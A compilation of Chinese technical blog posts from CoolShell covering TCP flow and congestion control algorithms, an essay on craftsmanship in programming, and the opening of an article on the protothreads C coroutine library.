##### Jacobson / Karels 算法前面两种算法用的都是“加权移动平均”，这种方法最大的毛病就是如果RTT有一个大的波动的话，很难被发现，因为被平滑掉了。所以，1988年，又有人推出来了一个新的算法，这个算法叫Jacobson / Karels Algorithm（参看RFC6289）。这个算法引入了最新的RTT的采样和平滑过的SRTT的差距做因子来计算。 公式如下：（其中的DevRTT是Deviation RTT的意思）**SRTT** **= S** **RTT** **\+ α** ******(** **RTT** **– S** **RTT** **)** —— 计算平滑RTT**DevRTT** **= (1-β** **)*** **DevRTT** **\+ β** ***(|** **RTT-SRTT** **|)** ——计算平滑RTT和真实的差距（加权移动平均）**RTO= µ * SRTT + ∂ *DevRTT** —— 神一样的公式（其中：在Linux下，α = 0.125，β = 0.25， μ = 1，∂ = 4 ——这就是算法中的“调得一手好参数”，nobody knows why, it just works…） 最后的这个算法在被用在今天的TCP协议中（Linux的源代码在：tcp_rtt_estimator）。
#### TCP滑动窗口需要说明一下，如果你不了解TCP的滑动窗口这个事，你等于不了解TCP协议。我们都知道， **TCP必需要解决的可靠传输以及包乱序（reordering）的问题** ，所以，TCP必需要知道网络实际的数据处理带宽或是数据处理速度，这样才不会引起网络拥塞，导致丢包。所以，TCP引入了一些技术和设计来做网络流控，Sliding Window是其中一个技术。 前面我们说过， **TCP头里有一个字段叫Window，又叫Advertised-Window，这个字段是接收端告诉发送端自己还有多少缓冲区可以接收数据** 。 **于是发送端就可以根据这个接收端的处理能力来发送数据，而不会导致接收端处理不过来** 。 为了说明滑动窗口，我们需要先看一下TCP缓冲区的一些数据结构：上图中，我们可以看到：* 接收端LastByteRead指向了TCP缓冲区中读到的位置，NextByteExpected指向的地方是收到的连续包的最后一个位置，LastByteRcved指向的是收到的包的最后一个位置，我们可以看到中间有些数据还没有到达，所以有数据空白区。* 发送端的LastByteAcked指向了被接收端Ack过的位置（表示成功发送确认），LastByteSent表示发出去了，但还没有收到成功确认的Ack，LastByteWritten指向的是上层应用正在写的地方。
于是：* 接收端在给发送端回ACK中会汇报自己的AdvertisedWindow = MaxRcvBuffer – LastByteRcvd – 1;* 而发送方会根据这个窗口来控制发送数据的大小，以保证接收方可以处理。下面我们来看一下发送方的滑动窗口示意图：（图片来源）上图中分成了四个部分，分别是：（其中那个黑模型就是滑动窗口）* #1已收到ack确认的数据。   * #2发还没收到ack的。   * #3在窗口中还没有发出的（接收方还有空间）。   * #4窗口以外的数据（接收方没空间）下面是个滑动后的示意图（收到36的ack，并发出了46-51的字节）：下面我们来看一个接受端控制发送端的图示：（图片来源）##### Zero Window上图，我们可以看到一个处理缓慢的Server（接收端）是怎么把Client（发送端）的TCP Sliding Window给降成0的。此时，你一定会问，如果Window变成0了，TCP会怎么样？是不是发送端就不发数据了？是的，发送端就不发数据了，你可以想像成“Window Closed”，那你一定还会问，如果发送端不发数据了，接收方一会儿Window size 可用了，怎么通知发送端呢？
解决这个问题，TCP使用了Zero Window Probe技术，缩写为ZWP，也就是说，发送端在窗口变成0后，会发ZWP的包给接收方，让接收方来ack他的Window尺寸，一般这个值会设置成3次，第次大约30-60秒（不同的实现可能会不一样）。如果3次过后还是0的话，有的TCP实现就会发RST把链接断了。**注意** ：只要有等待的地方都可能出现DDoS攻击，Zero Window也不例外，一些攻击者会在和HTTP建好链发完GET请求后，就把Window设置为0，然后服务端就只能等待进行ZWP，于是攻击者会并发大量的这样的请求，把服务器端的资源耗尽。（关于这方面的攻击，大家可以移步看一下Wikipedia的SockStress词条）另外，Wireshark中，你可以使用tcp.analysis.zero_window来过滤包，然后使用右键菜单里的follow TCP stream，你可以看到ZeroWindowProbe及ZeroWindowProbeAck的包。##### Silly Window SyndromeSilly Window Syndrome翻译成中文就是“糊涂窗口综合症”。正如你上面看到的一样，如果我们的接收方太忙了，来不及取走Receive Windows里的数据，那么，就会导致发送方越来越小。到最后，如果接收方腾出几个字节并告诉发送方现在有几个字节的window，而我们的发送方会义无反顾地发送这几个字节。
要知道，我们的TCP+IP头有40个字节，为了几个字节，要达上这么大的开销，这太不经济了。另外，你需要知道网络上有个MTU，对于以太网来说，MTU是1500字节，除去TCP+IP头的40个字节，真正的数据传输可以有1460，这就是所谓的MSS（Max Segment Size）注意，TCP的RFC定义这个MSS的默认值是536，这是因为 RFC 791里说了任何一个IP设备都得最少接收576尺寸的大小（实际上来说576是拨号的网络的MTU，而576减去IP头的20个字节就是536）。**如果你的网络包可以塞满MTU，那么你可以用满整个带宽，如果不能，那么你就会浪费带宽** 。（大于MTU的包有两种结局，一种是直接被丢了，另一种是会被重新分块打包发送） 你可以想像成一个MTU就相当于一个飞机的最多可以装的人，如果这飞机里满载的话，带宽最高，如果一个飞机只运一个人的话，无疑成本增加了，也而相当二。所以， **Silly Windows Syndrome这个现像就像是你本来可以坐200人的飞机里只做了一两个人** 。 要解决这个问题也不难，就是避免对小的window size做出响应，直到有足够大的window size再响应，这个思路可以同时实现在sender和receiver两端。
* 如果这个问题是由Receiver端引起的，那么就会使用 David D Clark’s 方案。在receiver端，如果收到的数据导致window size小于某个值，可以直接ack(0)回sender，这样就把window给关闭了，也阻止了sender再发数据过来，等到receiver端处理了一些数据后windows size 大于等于了MSS，或者，receiver buffer有一半为空，就可以把window打开让send 发送数据过来。* 如果这个问题是由Sender端引起的，那么就会使用著名的 Nagle’s algorithm。这个算法的思路也是延时处理，他有两个主要的条件：1）要等到 Window Size>=MSS 或是 Data Size >=MSS，2）收到之前发送数据的ack回包，他才会发数据，否则就是在攒数据。另外，Nagle算法默认是打开的，所以，对于一些需要小包场景的程序—— **比如像telnet或ssh这样的交互性比较强的程序，你需要关闭这个算法** 。你可以在Socket设置TCP_NODELAY选项来关闭这个算法（关闭Nagle算法没有全局参数，需要根据每个应用自己的特点来关闭）
`setsockopt(sock_fd, IPPROTO_TCP, TCP_NODELAY, (char *)&value,sizeof(int));`另外，网上有些文章说TCP_CORK的socket option是也关闭Nagle算法，这不对。 **TCP_CORK其实是更新激进的Nagle算汉，完全禁止小包发送，而Nagle算法没有禁止小包发送，只是禁止了大量的小包发送** 。最好不要两个选项都设置。#### TCP的拥塞处理 – Congestion Handling上面我们知道了，TCP通过Sliding Window来做流控（Flow Control），但是TCP觉得这还不够，因为Sliding Window需要依赖于连接的发送端和接收端，其并不知道网络中间发生了什么。TCP的设计者觉得，一个伟大而牛逼的协议仅仅做到流控并不够，因为流控只是网络模型4层以上的事，TCP的还应该更聪明地知道整个网络上的事。具体一点，我们知道TCP通过一个timer采样了RTT并计算RTO，但是， **如果网络上的延时突然增加，那么，TCP对这个事做出的应对只有重传数据，但是，重传会导致网络的负担更重，于是会导致更大的延迟以及更多的丢包，于是，这个情况就会进入恶性循环被不断地放大。试想一下，如果一个网络内有成千上万的TCP连接都这么行事，那么马上就会形成“网络风暴”，TCP这个协议就会拖垮整个网络。** 这是一个灾难。
所以，TCP不能忽略网络上发生的事情，而无脑地一个劲地重发数据，对网络造成更大的伤害。对此TCP的设计理念是： **TCP不是一个自私的协议，当拥塞发生的时候，要做自我牺牲。就像交通阻塞一样，每个车都应该把路让出来，而不要再去抢路了。**关于拥塞控制的论文请参看《Congestion Avoidance and Control》(PDF)拥塞控制主要是四个算法： **1）慢启动** ， **2）拥塞避免** ， **3）拥塞发生** ， **4）快速恢复** 。这四个算法不是一天都搞出来的，这个四算法的发展经历了很多时间，到今天都还在优化中。 备注:* 1988年，TCP-Tahoe 提出了1）慢启动，2）拥塞避免，3）拥塞发生时的快速重传   * 1990年，TCP Reno 在Tahoe的基础上增加了4）快速恢复##### 慢热启动算法 – Slow Start首先，我们来看一下TCP的慢热启动。慢启动的意思是，刚刚加入网络的连接，一点一点地提速，不要一上来就像那些特权车一样霸道地把路占满。新同学上高速还是要慢一点，不要把已经在高速上的秩序给搞乱了。慢启动的算法如下(cwnd全称Congestion Window)：
1）连接建好的开始先初始化cwnd = 1，表明可以传一个MSS大小的数据。2）每当收到一个ACK，cwnd++; 呈线性上升3）每当过了一个RTT，cwnd = cwnd*2; 呈指数让升4）还有一个ssthresh（slow start threshold），是一个上限，当cwnd >= ssthresh时，就会进入“拥塞避免算法”（后面会说这个算法）所以，我们可以看到，如果网速很快的话，ACK也会返回得快，RTT也会短，那么，这个慢启动就一点也不慢。下图说明了这个过程。这里，我需要提一下的是一篇Google的论文《An Argument for Increasing TCP’s Initial Congestion Window》Linux 3.0后采用了这篇论文的建议——把cwnd 初始化成了 10个MSS。 而Linux 3.0以前，比如2.6，Linux采用了RFC3390，cwnd是跟MSS的值来变的，如果MSS< 1095，则cwnd = 4；如果MSS>2190，则cwnd=2；其它情况下，则是3。#####  拥塞避免算法 – Congestion Avoidance
前面说过，还有一个ssthresh（slow start threshold），是一个上限，当cwnd >= ssthresh时，就会进入“拥塞避免算法”。一般来说ssthresh的值是65535，单位是字节，当cwnd达到这个值时后，算法如下：1）收到一个ACK时，cwnd = cwnd + 1/cwnd2）当每过一个RTT时，cwnd = cwnd + 1这样就可以避免增长过快导致网络拥塞，慢慢的增加调整到网络的最佳值。很明显，是一个线性上升的算法。##### 拥塞状态时的算法前面我们说过，当丢包的时候，会有两种情况：1）等到RTO超时，重传数据包。TCP认为这种情况太糟糕，反应也很强烈。* sshthresh = cwnd /2     * cwnd 重置为 1     * 进入慢启动过程2）Fast Retransmit算法，也就是在收到3个duplicate ACK时就开启重传，而不用等到RTO超时。* TCP Tahoe的实现和RTO超时一样。* TCP Reno的实现是：        * cwnd = cwnd /2       * sshthresh = cwnd       * 进入快速恢复算法——Fast Recovery
上面我们可以看到RTO超时后，sshthresh会变成cwnd的一半，这意味着，如果cwnd<=sshthresh时出现的丢包，那么TCP的sshthresh就会减了一半，然后等cwnd又很快地以指数级增涨爬到这个地方时，就会成慢慢的线性增涨。我们可以看到，TCP是怎么通过这种强烈地震荡快速而小心得找到网站流量的平衡点的。##### 快速恢复算法 – Fast Recovery**TCP Reno**这个算法定义在RFC5681。快速重传和快速恢复算法一般同时使用。快速恢复算法是认为，你还有3个Duplicated Acks说明网络也不那么糟糕，所以没有必要像RTO超时那么强烈。 注意，正如前面所说，进入Fast Recovery之前，cwnd 和 sshthresh已被更新：* cwnd = cwnd /2   * sshthresh = cwnd然后，真正的Fast Recovery算法如下：* cwnd = sshthresh + 3 * MSS （3的意思是确认有3个数据包被收到了）   * 重传Duplicated ACKs指定的数据包   * 如果再收到 duplicated Acks，那么cwnd = cwnd +1   * 如果收到了新的Ack，那么，cwnd = sshthresh ，然后就进入了拥塞避免的算法了。
如果你仔细思考一下上面的这个算法，你就会知道， **上面这个算法也有问题，那就是——它依赖于3个重复的Acks** 。注意，3个重复的Acks并不代表只丢了一个数据包，很有可能是丢了好多包。但这个算法只会重传一个，而剩下的那些包只能等到RTO超时，于是，进入了恶梦模式——超时一个窗口就减半一下，多个超时会超成TCP的传输速度呈级数下降，而且也不会触发Fast Recovery算法了。通常来说，正如我们前面所说的，SACK或D-SACK的方法可以让Fast Recovery或Sender在做决定时更聪明一些，但是并不是所有的TCP的实现都支持SACK（SACK需要两端都支持），所以，需要一个没有SACK的解决方案。而通过SACK进行拥塞控制的算法是FACK（后面会讲）**TCP New Reno**于是，1995年，TCP New Reno（参见 RFC 6582 ）算法提出来，主要就是在没有SACK的支持下改进Fast Recovery算法的——* 当sender这边收到了3个Duplicated Acks，进入Fast Retransimit模式，开发重传重复Acks指示的那个包。如果只有这一个包丢了，那么，重传这个包后回来的Ack会把整个已经被sender传输出去的数据ack回来。如果没有的话，说明有多个包丢了。我们叫这个ACK为Partial ACK。
* 一旦Sender这边发现了Partial ACK出现，那么，sender就可以推理出来有多个包被丢了，于是乎继续重传sliding window里未被ack的第一个包。直到再也收不到了Partial Ack，才真正结束Fast Recovery这个过程我们可以看到，这个“Fast Recovery的变更”是一个非常激进的玩法，他同时延长了Fast Retransmit和Fast Recovery的过程。##### 算法示意图下面我们来看一个简单的图示以同时看一下上面的各种算法的样子：##### FACK算法FACK全称Forward Acknowledgment 算法，论文地址在这里（PDF）Forward Acknowledgement: Refining TCP Congestion Control 这个算法是其于SACK的，前面我们说过SACK是使用了TCP扩展字段Ack了有哪些数据收到，哪些数据没有收到，他比Fast Retransmit的3 个duplicated acks好处在于，前者只知道有包丢了，不知道是一个还是多个，而SACK可以准确的知道有哪些包丢了。 所以，SACK可以让发送端这边在重传过程中，把那些丢掉的包重传，而不是一个一个的传，但这样的一来，如果重传的包数据比较多的话，又会导致本来就很忙的网络就更忙了。所以，FACK用来做重传过程中的拥塞流控。
* 这个算法会把SACK中最大的Sequence Number 保存在 **snd.fack** 这个变量中，snd.fack的更新由ack带秋，如果网络一切安好则和snd.una一样（snd.una就是还没有收到ack的地方，也就是前面sliding window里的category #2的第一个地方）* 然后定义一个 **awnd = snd.nxt – snd.fack** （snd.nxt指向发送端sliding window中正在要被发送的地方——前面sliding windows图示的category#3第一个位置），这样awnd的意思就是在网络上的数据。（所谓awnd意为：actual quantity of data outstanding in the network）* 如果需要重传数据，那么， **awnd = snd.nxt – snd.fack + retran_data** ，也就是说，awnd是传出去的数据 + 重传的数据。* 然后触发Fast Recovery 的条件是： ( **( snd.fack – snd.una ) > (3*MSS) **) || (dupacks == 3) ) 。这样一来，就不需要等到3个duplicated acks才重传，而是只要sack中的最大的一个数据和ack的数据比较长了（3个MSS），那就触发重传。在整个重传过程中cwnd不变。直到当第一次丢包的snd.nxt<=snd.una（也就是重传的数据都被确认了），然后进来拥塞避免机制——cwnd线性上涨。
我们可以看到如果没有FACK在，那么在丢包比较多的情况下，原来保守的算法会低估了需要使用的window的大小，而需要几个RTT的时间才会完成恢复，而FACK会比较激进地来干这事。 但是，FACK如果在一个网络包会被 reordering的网络里会有很大的问题。#### 其它拥塞控制算法简介##### **TCP Vegas 拥塞控制算法**这个算法1994年被提出，它主要对TCP Reno 做了些修改。这个算法通过对RTT的非常重的监控来计算一个基准RTT。然后通过这个基准RTT来估计当前的网络实际带宽，如果实际带宽比我们的期望的带宽要小或是要多的活，那么就开始线性地减少或增加cwnd的大小。如果这个计算出来的RTT大于了Timeout后，那么，不等ack超时就直接重传。（Vegas 的核心思想是用RTT的值来影响拥塞窗口，而不是通过丢包） 这个算法的论文是《TCP Vegas: End to End Congestion Avoidance on a Global Internet》这篇论文给了Vegas和 New Reno的对比：关于这个算法实现，你可以参看Linux源码：/net/ipv4/tcp_vegas.h， /net/ipv4/tcp_vegas.c
########## HSTCP(High Speed TCP) 算法这个算法来自RFC 3649（Wikipedia词条）。其对最基础的算法进行了更改，他使得Congestion Window涨得快，减得慢。其中：* 拥塞避免时的窗口增长方式： cwnd = cwnd + α(cwnd) / cwnd   * 丢包后窗口下降方式：cwnd = (1- β(cwnd))*cwnd注：α(cwnd)和β(cwnd)都是函数，如果你要让他们和标准的TCP一样，那么让α(cwnd)=1，β(cwnd)=0.5就可以了。 对于α(cwnd)和β(cwnd)的值是个动态的变换的东西。 关于这个算法的实现，你可以参看Linux源码：/net/ipv4/tcp_highspeed.c#####  TCP BIC 算法2004年，产内出BIC算法。现在你还可以查得到相关的新闻《Google：美科学家研发BIC-TCP协议 速度是DSL六千倍》 BIC全称Binary Increase Congestion control，在Linux 2.6.8中是默认拥塞控制算法。BIC的发明者发这么多的拥塞控制算法都在努力找一个合适的cwnd – Congestion Window，而且BIC- TCP的提出者们看穿了事情的本质，其实这就是一个搜索的过程，所以BIC这个算法主要用的是Binary Search——二分查找来干这个事。 关于这个算法实现，你可以参看Linux源码：/net/ipv4/tcp_bic.c
##### TCP WestWood算法westwood采用和Reno相同的慢启动算法、拥塞避免算法。westwood的主要改进方面：在发送端做带宽估计，当探测到丢包时，根据带宽值来设置拥塞窗口、慢启动阈值。 那么，这个算法是怎么测量带宽的？每个RTT时间，会测量一次带宽，测量带宽的公式很简单，就是这段RTT内成功被ack了多少字节。因为，这个带宽和用RTT计算RTO一样，也是需要从每个样本来平滑到一个值的——也是用一个加权移平均的公式。 另外，我们知道，如果一个网络的带宽是每秒可以发送X个字节，而RTT是一个数据发出去后确认需要的时候，所以，X * RTT应该是我们缓冲区大小。所以，在这个算法中，ssthresh的值就是est_BD * min-RTT(最小的RTT值)，如果丢包是Duplicated ACKs引起的，那么如果cwnd > ssthresh，则 cwin = ssthresh。如果是RTO引起的，cwnd = 1，进入慢启动。 关于这个算法实现，你可以参看Linux源码： /net/ipv4/tcp_westwood.c##### 其它更多的算法，你可以从Wikipedia的 TCP Congestion Avoidance Algorithm 词条中找到相关的线索
####  后记好了，到这里我想可以结束了，TCP发展到今天，里面的东西可以写上好几本书。本文主要目的，还是把你带入这些古典的基础技术和知识中，希望本文能让你了解TCP，更希望本文能让你开始有学习这些基础或底层知识的兴趣和信心。当然，TCP东西太多了，不同的人可能有不同的理解，而且本文可能也会有一些荒谬之言甚至错误，还希望得到您的反馈和批评。（全文完）# 「我只是认真」聊聊工匠情怀作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**（感谢网友@Hesey小纯纯 投稿 博客 | 原文链接）**老罗的Smartisan T1手机发布会很多人应该都看了，发布会的最后老罗凝视着自己的工匠自画像，半晌没说话，随后转过身，慢慢离开舞台，屏幕下方只留下一句话：**我不是为了输赢，我就是认真。**这一瞬间让我想起93年「狮城舌战」的主角蒋昌建，在「人性本善还是人性本恶」的总结陈词最后，以顾城的名句，「黑夜给了我黑色的眼睛，我却用它寻找光明」，把整个辩论赛的氛围推向高潮。而老罗的这句话，和这句话背后的工匠背景，却以另外一种 **无声的却震人心魄的力量** ，敲打着每一个在场的，或是观看着整个发布会的观众的心绪。
「工匠情怀」，我深有体会，就像我在 面向GC的Java编程 一文中所提到的：**优秀程序员的价值，不在于其所掌握的几招屠龙之术，而是在细节中见真著。****如果我们可以一次把事情做对，并且做好，在允许的范围内尽可能追求卓越，为什么不去做呢？**追求卓越，追求完美，追求细节的极致。小时候看到那些修表匠，握着一个小螺丝刀，或是看着电工，用烙铁沾着锡和松香，在那一小寸的世界里，把坏了的地方修好，那种专注的眼神，觉得很厉害。现在再去回想那些工匠工作的场景，越发觉得钦佩。在我老家有一家刻章的店，在我上幼儿园的时候就已经在那开了很多年了。前段时间需要刻一个章，发现那家店还在，于是走进去，门口坐着一个老人，我确实记不得当年是不是他，不过看这岁数八九不离十。我以前在别的地方刻的章，都是在电脑里设计完图案后，激光刻蚀。但那次老人却是用的手刻，我着实惊呆了。只看他拿出一块红色的印底，右手持着刻刀，开始一下一下地刻着。虽然老人连话都不怎么说得清了，但是工作时那专注的神情，和精湛的手艺，以及最后成品那比机器更完美的效果，着实让我心里非常动容。目录* 一、技术人的执着   * 二、拾起初衷   * 三、发现更好的自己   * 四、细节是魔鬼
#### 一、技术人的执着我见过很多人，也见过很多程序员，都有如此的「工匠情怀」。做产品需求评审，有的人善于快速提供技术解决方案，在最短的时间内解决问题。但我见过的很多牛人，他们除了能在脑海里最快地形成方案原型，并且更深入地考虑各种细节点，最终能给出一个更趋于完善的技术方案。在他们身上，我看到了 **对这项职业的自我尊重，对自我价值的追求，也有对「卓越」的理解和渴求** 。《精通正则表达式》的译者余晟老师写过他和正则表达式的 缘起 。只是因为项目经理让他「多用Google，查查正则表达式的资料」，余老师打开了正则的大门，读完了英文原版的《Mastering Regular Expression》，如今成为了国内最了解正则表达式的人之一。看完那篇文章其实我想起了我的实习经历。那时候我刚去公司两三天，有一天我老板找我让我研究一下如何用Java里的MappedByteBuffer做文件内存映射来读取大文件。尽管我们当时要处理的文件很大，以我在学校编码的经验看，用普通的Reader也是可以很好地解决的。于是我说，「这个其实用Reader也能做，更简单一些，没那么麻烦。」老板反问我，「什么叫没那么麻烦，这是一个做技术的人的态度吗？」
那几天我花了很多时间，去从Linux一直到JVM，去了解什么是内存映射，底层原理是什么，和其它技术的比较、优缺点，并和其它几种读文件的技术做了性能对比。虽然最后项目没有采用这个方案，但是那句反问直到现在一直在我脑海里，时时地提醒我：「 **做技术的人，对待技术，应该拥有什么样的态度？** 」所以其实我很感谢我的老板，以前他教我们这些新人优秀的职场习惯，有一条是每天的邮件必须没有未读数，即便是不需要阅读的邮件，也要一键置为已读，不要留一个未读的数字在那。现在想起来，有点像iOS App右上角那个提醒数的角标，有些强迫症的人怎么也忍受不了有个红圈圈在那。开个玩笑，虽然有些习惯看起来可有可无，无关紧要，但这确实映射了一种态度和思维习惯。**完美有多远？我不知道，但我愿意多往前走一步。**#### 二、拾起初衷我们的生活，每天很忙碌。有时候忙得自己都忘记了为什么在此处，有时候忙得只能不断地用直觉、用以往的经验去设计一个解决方案，而没有时间去思考需求是不是合理，方案是不是最佳，我们以为自己设计的是最佳实践，谁知道呢？这个社会，这个世界，处在一个以不可思议的速度向前直奔的时间线上，我们处在这个时代的浪潮之上，每个人都感到了那种令人窒息的紧迫感。
父母都是不希望孩子太累的，我们见过很多这样的话：**差不多就行了。****糊弄糊弄就完事了。****不要与众不同。****顺其自然。**但是你应该问问自己，是不是真的要 顺其自然 ？我记得在上大二的时候，听一个叫端木恒的人说过一句话，大意是， **这个世界上，政治可以改变很多事情，而科技，可以通过促进信息的流通，最终去推动政治的变革，去改变整个世界。**当时觉得这事儿太酷了，是的，所以我当时的想法是，要去一个技术足够强大，并且对人们的生活有实质影响的公司。希望用技术的力量去让更多人生活地更好。这当然是一种不自量力，但又如何呢？只是一个普通人小小的想法，不断追求卓越，愿意比别人多往前走一步而已。就像冯大辉说的：**所有人都说你做不成，都告诉你不要去做，不靠谱，嘲讽你，而你最后真的把事情做起来了，这就是牛逼。**做成了，其实牛不牛逼对你自己而言已经不重要了。没做成，所有人都笑你是傻逼，但起码也对得起自己的内心。再说，如果 青年人 想的都是养老和退休，那做事的人在哪？#### 三、发现更好的自己老罗最后的一个问题是：**在一个完美主义者的眼里，这是一个怎样的世界？**这个社会上很多人在生活上追求更高的品质，但愿意对自己手头所做的事情坚持高标准坚持卓越理念的人已经不多见了，以至于我们发现 **花再多的钱也买不到安全的食品了，花了一辈子的积蓄买的房子却有各种质量问题。** 扪心自问自己在工作中是否能坚持某些东西，大部分人的态度都差不多，只是你糊弄一下不会怎样，而他马虎一点就会死人，区别仅仅在于这里。
M·斯科特·派克说过一句话：**规避问题和逃避问题的趋向，是人类心理疾病的根源。**很多人把随大流把妥协作为一种「成熟」的标志，小时候敢想敢说可能也敢做，长大以后懂得了人情世故，懂得向现实妥协，45度角仰望天空说自己终于长大了。再看身边那些「冥顽不灵」、「认死理」的所谓完美主义者，认为这些人才是不正常的群体，把这些人要么当做傻逼要么当做装逼。天哪，我都想问，「这是一个怎样的世界？」肯定有人会说，站着说话不腰疼。诚然，在生活中，有的人是为了活下去，有的人是为了活得更好，有的人是为了帮助别人活得更好。这是不同的人生阶段，每个人的情况不一样，但这并不影响每个人内心的精神寄托和对信念的追求。我从不指望去改变别人，但我相信我可以改变自己，虽然也很难。学生都喜欢问，如何最快地告诉自己的能力。说实话，我真的不知道什么是捷径，我的经验就是和比你优秀的人一起工作，经常请教比你资深的人，不断挑战过去的自己（每天审视自己太紧张了，只要比前段时间的自己更好就可以了）。#### 四、细节是魔鬼Devils are in the details，细节是魔鬼，这句话很多人都听过，但要在工作中时时刻刻注意？难。前几天给同事做Code Review，就几行代码，发现了一个问题。
场景是我们发现某个系统中存在占用内存超大的HTML字符串，需要统计HTML字符串的长度，于是为了获得准确的字节长度，这段代码调用的是String.getBytes().length，一眼看起来并没有什么大问题。但是考虑到本身这个字符串就比较大，联想到Java内部是用UTF-16存储字符串的，而getBytes()会转换为系统默认编码（GBK或是UTF-8等等），这里必然存在底层字符数组的拷贝（可以去参考String.getBytes()的源代码证实），一个本身就很大的字符串，经过拷贝，将会占用更多的内存，加剧这个问题，而在HTML中，中文其实只占了非常小的一部分，所以直接用String.length()，虽然会少数几个字符，但对统计结果影响其实并不大，并且这里不存在任何数组分配的开销。另外建议所有调用String.getBytes()的地方通通显式传入编码，这是个大坑。（ _陈皓注：用String.length代替getBytes().length，也是在给未来挖坑——如果未来有人要用len来干别的事，那么这个不精确的len可能就是一个大坑_ ）另外一个案例，也是在Code Review的时候发现的。
某个调用场景下，每次都会新建一个解析器对象去解析结果，尽管解析器没有任何实例变量不会产生线程安全问题，创建的开销也并不大，但我还是坚持要改成单例，使用同一个实例去处理，这也符合面向GC编程的思想。这些场景，每天我们都在遇到， **也许我们会说这些都是很小的问题，无伤大雅，差不多就行了。** 但就像前面说的，这是一种态度，一种思维习惯，当你坚持用最高的标准去要求自己，去要求自己的工作时，你才有可能渐渐接近卓越。细节是魔鬼，它会在完全察觉不到的时刻，把人拉回平庸。「我不是为了输赢，我就是认真。」这不代表我们不在乎输赢，从头至尾我都坚信，只有坚持完美，坚持品质，坚持那些我们曾经了解现在可能已经放弃了的美好的东西，像一个老工匠，把一种专注、追求极致的情怀融入我们的作品里，也许有一天，就有人，追寻着 梦想 ，发现了 生活更多的可能性 ，像乔布斯、像贝索斯，改变整个行业，改变全世界。我们是被这个时代推上浪潮之巅的人，是去做一个见证者，或是一个冲在最前面也不怕被拍死的傻瓜，是我们每个人选择的权利。只是不要忘记，那些傻瓜，不是真的不怕死， **他们只是认真** 。（全文完）# 一个“蝇量级” C 语言协程库
作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**（感谢网友** **@我的上铺叫路遥** **投稿）**协程(coroutine)顾名思义就是“协作的例程”（co-operative routines）。跟具有操作系统概念的线程不一样，协程是在用户空间利用程序语言的语法语义就能实现逻辑上类似多任务的编程技巧。实际上协程的概念比线程还要早，按照 Knuth 的说法 **“子例程是协程的特例”** ，一个子例程就是一次子函数调用，那么实际上协程就是类函数一样的程序组件，你可以在一个线程里面轻松创建数十万个协程，就像数十万次函数调用一样。只不过子例程只有一个调用入口起始点，返回之后就结束了，而协程入口既可以是起始点，又可以从上一个返回点继续执行，也就是说协程之间可以通过 yield 方式转移执行权， **对称（symmetric）、平级** 地调用对方，而不是像例程那样上下级调用关系。当然 Knuth 的“特例”指的是协程也可以模拟例程那样实现上下级调用关系，这就叫 **非对称协程** （asymmetric coroutines）。目录* 基于事件驱动模型   * “蝇量级”的协程库   * C 语言的“yield 语义”   * Protothreads的上下文   * Protothreads的原语和组件   * Protothreads实战   * 协程库 DIY 攻略
#### 基于事件驱动模型我们举一个例子来看看一种 **对称协程** 调用场景，大家最熟悉的“生产者- 消费者”事件驱动模型，一个协程负责生产产品并将它们加入队列，另一个负责从队列中取出产品并使用它。为了提高效率，你想一次增加或删除多个产品。伪代码可以是这样的：# producer coroutine     loop     while queue is not full     create some new items     add the items to queue     yield to consumer# consumer coroutine     loop     while queue is not empty     remove some items from queue     use the items     yield to producer大多数教材上拿这种模型作为多线程的例子，实际上多线程在此的应用还是显得有点“重量级”，由于缺乏 yield 语义，线程之间不得不使用同步机制来避免产生全局资源的竟态，这就不可避免产生了休眠、调度、切换上下文一类的系统开销，而且线程调度还会产生时序上的不确定性。而对于协程来说，“挂起”的概念只不过是转让代码执行权并调用另外的协程，待到转让的协程告一段落后重新得到调用并从挂起点“唤醒”，这种协程间的调用是逻辑上可控的，时序上确定的，可谓一切尽在掌握中。
当今一些具备协程语义的语言，比较重量级的如C#、erlang、golang，以及轻量级的python、lua、javascript、ruby，还有函数式的scala、scheme等。相比之下，作为原生态语言的 C 反而处于尴尬的地位，原因在于 C 依赖于一种叫做 **栈帧** 的例程调用，例程内部的状态量和返回值都保留在堆栈上，这意味着生产者和消费者相互之间无法实现平级调用，当然你可以改写成把生产者作为主例程然后将产品作为传递参数调用消费者例程，这样的代码写起来费力不讨好而且看起来会很难受，特别当协程数目达到十万数量级，这种写法就过于僵化了。这就引出了协程的概念， **如果将每个协程的上下文（比如程序计数器）保存在其它地方而不是堆栈上，协程之间相互调用时，被调用的协程只要从堆栈以外的地方恢复上次出让点之前的上下文即可，这有点类似于 CPU 的上下文切换，** 遗憾的是似乎只有更底层的汇编语言才能做到这一点。难道 C 语言只能用多线程吗？幸运的是，C 标准库给我们提供了两种协程调度原语：一种是 setjmp/longjmp，另一种是 ucontext 组件，它们内部（当然是用汇编语言）实现了协程的上下文切换，相较之下前者在应用上会产生相当的不确定性（比如不好封装，具体说明参考联机文档），所以后者应用更广泛一些，网上绝大多数 C 协程库也是基于 ucontext 组件实现的。
#### “蝇量级”的协程库在此，我来介绍一种“蝇量级”的开源 C 协程库 protothreads。这是一个全部用 ANSI C 写成的库，之所以称为“蝇量级”的，就是说，实现已经不能再精简了，几乎就是原语级别。事实上 protothreads 整个库不需要链接加载，因为所有源码都是头文件，类似于 STL 这样不依赖任何第三方库，在任何平台上可移植；总共也就 5 个头文件，有效代码量不足 100 行；API 都是宏定义的，所以不存在调用开销；最后，每个协程的空间开销是 2 个字节（是的，你没有看错，就是一个 short 单位的“栈”！）当然这种精简是要以使用上的局限为代价的，接下来的分析会说明这一点。先来看看 protothreads 作者，Adam Dunkels，一位来自瑞典皇家理工学院的计算机天才帅哥。话说这哥们挺有意思的，写了好多轻量级的作品，都是 BSD 许可证。顺便说一句，轻量级开源软件全世界多如牛毛，可像这位哥们写得如此出名的并不多。比如嵌入式网络操作系统 Contiki，国人耳熟能详的 TCP/IP 协议栈 uIP "http://en.wikipedia.org/wiki/UIP_\(micro_IP\)") 和 lwIP 也是出自其手。上述这些软件都是经过数十年企业级应用的考验，质量之高可想而知。
